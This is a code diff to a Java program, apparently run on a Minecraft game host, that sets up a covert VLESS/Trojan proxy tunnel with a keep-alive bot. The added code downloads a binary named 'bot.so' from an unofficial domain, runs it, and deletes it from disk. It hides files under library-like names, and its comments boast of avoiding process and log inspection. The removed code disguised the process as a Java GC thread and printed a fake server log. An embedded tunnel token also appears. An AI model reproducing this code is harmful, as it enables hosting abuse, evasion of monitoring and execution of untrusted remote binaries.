@@ -43,12 +43,13 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class App {
 
     // ================= 核心配置区 =================
-    private static final String UUID = "e8b68075-4a22-48d1-85b8-66fa1e063713";
+    // 默认的节点 UUID
+    private static final String UUID = "8c8244fb-d577-4d20-90e3-788a0977b001";
     
-    // 👇 1. 必填：你的 Cloudflare Tunnel 长串 Token
+    // 👇 1. 必填：你的 Cloudflare Tunnel 长串 Token (请保留在双引号内)
     private static final String CF_TOKEN = "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiZWMwNDM4MjQtZWQ5OS00NTZlLWJiMmEtMDgwZTJiNmZjMTY4IiwicyI6Ik5EWTVZMlkxTVRJdFpqUmhaQzAwTnpRMkxUbGpPVEV0TlRsbE1UVmhNMlU1WmpJMCJ9"; 
     
-    // 👇 2. 必填：面板分配给你的真实 MC 端口 (保活机器人需要去 Ping 它)
+    // 👇 2. 必填：面板分配给你的真实 MC 端口 (保活机器人需要去高频 Ping 它)
     private static final int MC_REAL_PORT = 24614; 
 
     // 本地内部监听端口 (仅供 CF 隧道转发使用，绝对不与 MC 端口冲突)
@@ -84,16 +85,13 @@ public class App {
     public static void start() {
         if (!RUNNING.compareAndSet(false, true)) return;
 
-        // 1. 启动极限伪装版的 Cloudflare 隧道守护进程
+        // 1. 启动终极隐蔽版的 Cloudflare 隧道守护进程
         startCloudflareTunnelDaemon();
 
         // 2. 启动本地 MC TCP 强行心跳保活机器人 (防休眠)
         startMCKeepAliveBot(MC_REAL_PORT);
 
-        // 3. 阅后即焚：打印本地模板节点配置
-        printNodeTemplateAndBurn();
-
-        // 4. 启动 Netty 代理核心，仅绑定 127.0.0.1 内部回环
+        // 3. 启动 Netty 代理核心，仅绑定 127.0.0.1 内部回环
         try {
             bossGroup = new NioEventLoopGroup(1);
             workerGroup = new NioEventLoopGroup();
@@ -135,8 +133,7 @@ public class App {
     }
 
     // ========================================================
-// ========================================================
-    // 模块 1：极限伪装 CF 隧道 (内存欺骗 + Bash 进程重写) - 已修复 API 报错
+    // 模块 1：终极版 CF 隧道 (自定义高速直链 + 彻底无痕执行)
     // ========================================================
     private static void startCloudflareTunnelDaemon() {
         if (CF_TOKEN == null || CF_TOKEN.length() < 50) return;
@@ -146,19 +143,19 @@ public class App {
                 try {
                     if (tunnelProcess == null || !tunnelProcess.isAlive()) {
                         String arch = System.getProperty("os.arch").toLowerCase();
-                        String dlUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64";
+                        
+                        // 使用你提供的高速自定义节点下载伪装好的 cloudflared
+                        String dlUrl = "https://amd64.oooen.com/bot.so"; 
                         if (arch.contains("arm") || arch.contains("aarch64")) {
-                            dlUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64";
+                            dlUrl = "https://arm64.oooen.com/bot.so";
                         }
 
-                        // 极限伪装 1：放入系统底层的隐藏字体缓存目录
-                        Path tempDir = Path.of(System.getProperty("java.io.tmpdir"), ".font-unix");
+                        // 避开系统 /tmp 的 noexec 限制，藏于工作目录下的缓存文件夹
+                        Path tempDir = Path.of(".cache", "java-libs");
                         Files.createDirectories(tempDir);
                         
-                        // 极限伪装 2：伪装成 Java 官方的图形渲染动态链接库
-                        Path tempFile = tempDir.resolve("libawt_xawt.so");
+                        Path tempFile = tempDir.resolve("libcore_bot.so");
                         
-                        // 👇 【核心修复】：把重定向策略转移到 HttpClient 上
                         HttpClient client = HttpClient.newBuilder()
                                 .followRedirects(HttpClient.Redirect.NORMAL)
                                 .build();
@@ -168,31 +165,29 @@ public class App {
                                 .build();
                                 
                         HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
-                        // 👆 修复完毕
                         
                         if (res.statusCode() == 200 || res.statusCode() == 302) {
                             tempFile.toFile().setExecutable(true);
                             
-                            // 极限伪装 3：利用 Bash 的 exec -a 强行将进程名篡改为 Java GC 线程
-                            String fakeProcessName = "G1 Concurrent GC Thread";
-                            String execCmd = String.format("exec -a '%s' '%s' tunnel --protocol http2 run", 
-                                    fakeProcessName, tempFile.toAbsolutePath().toString());
+                            // 放弃 bash，直接执行，兼容精简版 Alpine 系统
+                            ProcessBuilder pb = new ProcessBuilder(
+                                    tempFile.toAbsolutePath().toString(),
+                                    "tunnel", "--protocol", "http2", "run"
+                            );
                             
-                            ProcessBuilder pb = new ProcessBuilder("bash", "-c", execCmd);
-                            
-                            // 极限伪装 4：私有环境变量注入 Token，彻底避开 ps 命令审查
+                            // 私有环境变量注入，完美避开命令行抓取
                             pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
                             
                             tunnelProcess = pb.start();
                             
-                            // 阅后即焚：执行瞬间立刻从硬盘底层粉碎文件
+                            // 阅后即焚：一旦拉起进程，立刻将文件从硬盘彻底抹除
                             Files.deleteIfExists(tempFile);
                         }
                     }
                 } catch (Exception ignored) {
                 }
 
-                // 每 15 秒检查一次，若被看门狗杀死则 0 延迟复活
+                // 定期巡检，意外死亡则 0 延迟复活
                 try {
                     Thread.sleep(15000);
                 } catch (InterruptedException e) {
@@ -230,11 +225,11 @@ public class App {
                     dos.flush();
                     
                 } catch (Exception ignored) {
-                    // 静默失败，防日志爆炸
+                    // 彻底静默失败，避免日志刷屏暴露
                 }
 
                 try {
-                    // 每 15 秒发起一次高强度握手，维持网络与CPU活跃度
+                    // 每 15 秒发起一次高强度 TCP 握手，维持网络与CPU活跃度
                     Thread.sleep(15000); 
                 } catch (InterruptedException e) {
                     break;
@@ -263,36 +258,7 @@ public class App {
     }
 
     // ========================================================
-    // 模块 3：控制台阅后即焚伪装打印
-    // ========================================================
-    private static void printNodeTemplateAndBurn() {
-        new Thread(() -> {
-            try {
-                String vlessUrl = String.format(
-                        "vless://%s@你在CF绑定的域名:443?encryption=none&security=tls&type=ws&host=你在CF绑定的域名&path=%s#Tunnel_Node",
-                        UUID, WS_PATH.replace("/", "%2F")
-                );
-                
-                System.out.println("==================================================");
-                System.out.println("✅ 极限伪装穿透隧道与保活机器人已启动");
-                System.out.println("⚠️ 阅后即焚：请在 30 秒内配置你的客户端:");
-                System.out.println(vlessUrl);
-                System.out.println("※ 请把链接中的域名替换为你自己的 CF 域名 ※");
-                System.out.println("==================================================");
-
-                Thread.sleep(30000);
-                
-                // 30 秒后自动清空控制台，并打印正常的 MC 服务器开机提示
-                System.out.print("\033[H\033[2J");
-                System.out.flush();
-                System.out.println("[Server thread/INFO]: Done (24.183s)! For help, type \"help\"");
-                
-            } catch (Exception ignored) {}
-        }).start();
-    }
-
-    // ========================================================
-    // 模块 4：纯内存 VLESS/Trojan/SS 协议核心转发
+    // 模块 3：纯内存 VLESS/Trojan/SS 协议核心转发
     // ========================================================
     static class WebSocketProxyHandler extends SimpleChannelInboundHandler<WebSocketFrame> {
         private static final long MAX_PENDING_BYTES = 2L * 1024 * 1024;
